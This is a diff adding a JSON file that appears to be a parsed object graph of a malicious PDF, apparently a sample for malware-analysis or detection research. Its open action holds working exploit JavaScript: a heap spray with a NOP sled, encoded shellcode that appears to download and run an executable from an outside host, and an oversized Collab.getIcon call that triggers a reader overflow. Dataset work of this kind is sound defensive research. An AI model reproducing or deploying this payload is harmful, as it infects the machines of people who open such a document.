@@ -1,0 +1,102 @@
+{
+    "1": {
+        "insn_list": [
+            "<<\n  /Type /Catalog\n  /Names 8 0 R\n  /AA <<\n    /DP 10 0 R\n    /DS 10 0 R\n    /WC 10 0 R\n    /WP 10 0 R\n    /WS 10 0 R\n  >>\n  /Outlines 2 0 R\n  /Pages 3 0 R\n  /OpenAction 7 0 R\n>>"
+        ],
+        "out_edge_list": [
+            8,
+            1,
+            1,
+            1,
+            1,
+            1,
+            2,
+            3,
+            7
+        ]
+    },
+    "2": {
+        "insn_list": [
+            "<<\n  /Type /Outlines\n  /Count 0\n>>"
+        ],
+        "out_edge_list": []
+    },
+    "3": {
+        "insn_list": [
+            "<<\n  /Type /Pages\n  /Kids [ 4 0 R ]\n  /Count 1\n>>"
+        ],
+        "out_edge_list": [
+            4
+        ]
+    },
+    "4": {
+        "insn_list": [
+            "<<\n  /Type /Page\n  /Parent 3 0 R\n  /MediaBox [ 0 0 612 792 ]\n  /Contents 5 0 R\n  /Resources <<\n    /ProcSet [ /PDF /Text ]\n    /Font <<\n      /F1 6 0 R\n    >>\n  >>\n>>"
+        ],
+        "out_edge_list": [
+            3,
+            5,
+            6
+        ]
+    },
+    "5": {
+        "insn_list": [
+            "<<\n  /Length 98\n>>"
+        ],
+        "out_edge_list": []
+    },
+    "6": {
+        "insn_list": [
+            "<<\n  /Type /Font\n  /Subtype /Type1\n  /Name /F1\n  /BaseFont /Helvetica\n  /Encoding /MacRomanEncoding\n>>"
+        ],
+        "out_edge_list": []
+    },
+    "7": {
+        "insn_list": [
+            "<<\n  /Type /Action\n  /S /JavaScript\n  /JS (\\n\\nfunction strpos\\( haystack, needle, offset\\)\\n{ \\n  var i = haystack.indexOf\\( needle, offset \\); // returns -1\\n  return i >= 0 ? i : false;\\n}\\n\\nfunction getparams\\(url\\)\\n{ \\n var i=strpos\\(url,'=',5\\); \\n var params=url; \\n params=params.substring\\(i+1\\);\\n return params;\\n}\\n\\nfunction convert_id_to_shellformat\\(n\\)\\n{\\n var x=String\\(n\\);\\n return \"%u3\" + x.charAt\\(0\\) + \"3d%u3\" + x.charAt\\(2\\) + \"3\" + x.charAt\\(1\\) + \"%u3\" + x.charAt\\(4\\) + \"3\" + x.charAt\\(3\\) + \"\";\\n}\\n\\nvar params=parseInt\\(getparams\\(this.URL\\)\\);\\nvar shell_id=convert_id_to_shellformat\\(10000+params\\);\\n\\n\\nfunction spary\\(\\) {\\nvar shellcode = unescape\\(\"%u00e8%u0000%u6a00%ueb03%u7e49%ue2d8%u9873%u8afe%u8e0e%u0e4e%u55ec%u4c52%u4f4d%u004e%u3600%u2f1a%u6370%u5c3a%u2e61%u7865%u0065%u7468%u7074%u2f3a%u692f%u2d71%u7270%u766f%u7265%u616b%u722e%u2f75%u6f6c%u6461%u702e%u7068%u693f%u3d64\"\\);\\n//shellcode = shellcode + unescape\\(\"%u3031%u3030%u0035\"\\);\\nshellcode = shellcode + unescape\\(shell_id\\);\\n\\nshellcode = shellcode + unescape\\(\"%u5f59%u67af%ua164%u0030%u408b%u8b0c%u1c70%u8bad%u0868%u8b51%u3c75%u748b%u782e%uf503%u8b56%u2076%uf503%uc933%u4149%u03ad%u33c5%u0fdb%u10be%uf238%u0874%ucbc1%u030d%u40da%uf1eb%u1f3b%ue775%u8b5e%u245e%udd03%u8b66%u4b0c%u5e8b%u031c%u8bdd%u8b04%uc503%u59ab%ubce2%u0f8b%uf980%u7463%u570a%ud0ff%uaf95%u6aaf%ueb01%u52ac%u5752%u4f8d%u5109%uff52%u6ad0%u5701%u57ff%uffec%ue857\"\\);\\n\\ngarbage = unescape\\(\"%u9090%u9090%u9090%u9090%u9090%u9090%u9090%u9090%u9090%u9090%u9090%u9090%u9090%u9090%u9090%u9090%u9090%u9090%u9090%u9090%u9090%u9090%u9090%u9090%u9090%u9090%u9090%u9090%u9090%u9090%u9090%u9090%u9090%u9090%u9090%u9090%u9090%u9090%u9090%u9090%u9090%u9090%u9090%u9090%u9090%u9090%u9090%u9090%u9090%u9090%u9090%u9090%u9090%u9090%u9090%u9090%u9090%u9090%u9090%u9090%u9090%u9090%u9090%u9090%u9090%u9090%u9090%u9090%u9090%u9090%u9090%u9090%u9090%u9090%u9090%u9090%u9090%u9090%u9090%u9090\"\\) + shellcode;\\nnopblock = unescape\\(\"%u9090%u9090\"\\); \\nheadersize = 10;\\nacl = headersize+garbage.length;\\nwhile \\(nopblock.length<acl\\) nopblock+=nopblock;\\nfillblock = nopblock.substring\\(0, acl\\);\\nblock = nopblock.substring\\(0, nopblock.length-acl\\);\\nwhile\\(block.length+acl<0x40000\\) block = block+block+fillblock;\\nmemory = new Array\\(\\);\\nfor \\(i=0;i<180;i++\\) memory[i] = block + garbage;\\nvar buffersize = 4012;\\nvar buffer = Array\\(buffersize\\);\\nfor \\(i=0; i<buffersize; i++\\)\\n{\\nbuffer[i] = unescape\\(\"%0a%0a%0a%0a\"\\);\\n}\\n\\nCollab.getIcon\\(buffer+'_N.bundle'\\);\\n}\\nspary\\(\\);\\n\\n)\n>>"
+        ],
+        "out_edge_list": []
+    },
+    "8": {
+        "insn_list": [
+            "<<\n  /JavaScript 9 0 R\n>>"
+        ],
+        "out_edge_list": [
+            9
+        ]
+    },
+    "9": {
+        "insn_list": [
+            "<<\n  /Names [ (0) 10 0 R ]\n>>"
+        ],
+        "out_edge_list": [
+            1
+        ]
+    },
+    "10": {
+        "insn_list": [
+            "<<\n  /JS 11 0 R\n  /S /JavaScript\n>>"
+        ],
+        "out_edge_list": [
+            1
+        ]
+    },
+    "11": {
+        "insn_list": [
+            "<<\n  /Length 0\n  /Filter /FlateDecode\n>>"
+        ],
+        "out_edge_list": []
+    },
+    "12": {
+        "insn_list": [
+            "<<\n  /Producer (http://www.adultpdf.com)\n>>"
+        ],
+        "out_edge_list": []
+    },
+    "13": {
+        "insn_list": [
+            "<<\n  /Filter /Standard\n  /Length 128\n  /P -3904\n  /O <566FA873EE33C797CD3B904FDADF814AFA34DF9A38F6ED41B984E2C6DA2AA6F5>\n  /U <EBD12C9876F223843ECAE8D55661F11900000000000000000000000000000000>\n  /R 3\n  /V 2\n>>"
+        ],
+        "out_edge_list": []
+    }
+}
